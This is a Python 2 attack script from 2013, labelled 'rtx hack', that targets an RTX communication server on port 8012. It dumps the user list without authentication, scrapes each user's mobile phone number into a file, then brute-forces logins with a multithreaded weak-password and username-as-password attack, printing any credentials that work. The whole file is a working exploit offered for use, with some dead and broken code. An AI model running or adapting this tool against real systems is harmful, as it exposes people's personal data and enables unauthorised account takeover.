#!/usr/bin/env python

#-*-coding=utf-8-*-

# date : 2013.12.16

# rtx hack



import threading

import urllib

import re

import sys

import getopt

import json

import threading

import httplib

import time



def usage():

    print '''

Usage : ./f.py -u target_ip

-h   Show this page!

'''



class postThread(threading.Thread):

 

    def __init__(self, data):

        threading.Thread.__init__(self)

        self.data = data

    def run(self):

        for x in self.data:

            try:

                print self.data

            except Exception, e:

                print e

                



class rtx(object):

    'rtx attacker class'

    ip = ''



    data = ''



    port = '8012'

    

    fullData = ''

    



    def __init__(self, ip):

        if self.checkIp(ip):

            self.ip = ip

            url = "http://"+ip+":"+self.port+"/userlist.php"

            try:

                content = urllib.urlopen(url).read()

                self.data = json.loads(content)

            except (IOError,ValueError),e:

                print "\033[1;31m"+self.ip+"\33[0m is not vulnerable!"

                sys.exit()

            self.checkVulnerable()

            #print self.data

            self.checkPhone()

            self.bruteforce()

        else:

            print " ______________"

            print " \033[07m  are you kidding me? \033[27m               "            

            print "      \                    "

            print "       \   \033[1;31m,__,\033[1;m             " 

            print "        \  \033[1;31m(\033[1;moo\033[1;31m)____\033[1;m        "

            print "           \033[1;31m(__)    )\ \033[1;m  "

            print "           \033[1;31m   ||--|| \033[1;m\033[05m*\033[25m\033[1;m      [ l137 | lietdai@gmail.com ]\r\n\r\n"





    @staticmethod

    def checkIp(ip):

        pattern = r"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b"

        if re.match(pattern, ip):

            return True

        else:

            return False



    def checkVulnerable(self):

        print "\033[1;31m Oh...I got something!!"

        print " Please wait a bit....."

        #for x in range(len(self.data)):

        #    print self.data[x]

        print " "+str(len(self.data))+" records was found!! \033[0m"



    def checkPhone(self):

        print "\033[1;31m Now check phone number in records.....\033[0m"

        url = "http://"+self.ip+":"+self.port+"/getmobile.cgi?receiver="

        output = file('out.txt','w')

        for x in xrange(0,len(self.data)):

            url2 = url + self.data[x]['name']

            self.data[x]['phone'] = urllib.urlopen(url2).read()

            try:

                output.write(str(self.data[x]['id'])+'\t'+self.data[x]['name']+'\t'+self.data[x]['phone']+'\n')

                print self.data[x]

            except Exception,e:

                print e

        output.close()

        print "\033[1;31m put the records int out.txt\033[0m"

        #print self.data



    def bruteforce(self):

        print "\033[1;31m Brute force starting...."

        num = raw_input(" Please input the number of threads for brute force(default 10) : ")

        print " And it will take a little time ...\033[0m"

        if num == '':

            num = 10

        else :

            try :

                num = int(num)                

            except ValueError,e:

                print e

                sys.exit()

            if (num < 1) or (num > 15):

                print "threads must in 1-15"

                sys.exit()

                

        threads = [];

        block = len(self.data)/num

        for i in xrange(0, num):

            if i == num-1:

                data = self.data[block*i:]

            else:

                data = self.data[i*block:(i+1)*block]

            t = threading.Thread(target=self.fwork, args = (self.port, self.ip, data))

            threads.append(t)

        for i in threads:

            i.start()



    @staticmethod

    def fwork(port,ip,b):

        for x in xrange(0,len(b)):

            dicts = ['111111','123456','qweasd','222222','12345678','000000','qusiba','666666']

            #dicts.append(b[x]['phone'])

            dicts.append(b[x]['name'])

            for x in dicts:

                httpClient = None

                try:

                    name = dicts[-1]

                    postData = urllib.urlencode({'user':name,'pwd':x})

                    headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"};

                    httpClient = httplib.HTTPConnection(ip, port, timeout=30)

                    httpClient.request("POST", "/check.php", postData, headers)

                    response = httpClient.getresponse()

                    responseHeader =  response.getheaders()

                    if responseHeader[1][1] == '2573':

                        print name,x

                except Exception, e:

                    print e

                finally:

                    httpClient.close()

    def getWeakPass(self):

        file_ob = open("password.txt")

        try:

            list_file = file_ob.readlines()

        finally:

            file_ob.close()

            for x in list_file:

                self.dists.append(x.strip('\n'))



def main():

    try:

        opts, args = getopt.getopt(sys.argv[1:], "u:h", ["help"])

    except getopt.GetoptError:

        usage()

        sys.exit()

    for o,a in opts:

        if o in ("-h", "--help"):

            usage()

        elif o == "-u":

            r = rtx(a)

        else : 

            usage()

    if len(opts) == 0:

        usage()

    

if __name__ == "__main__" :

    main()
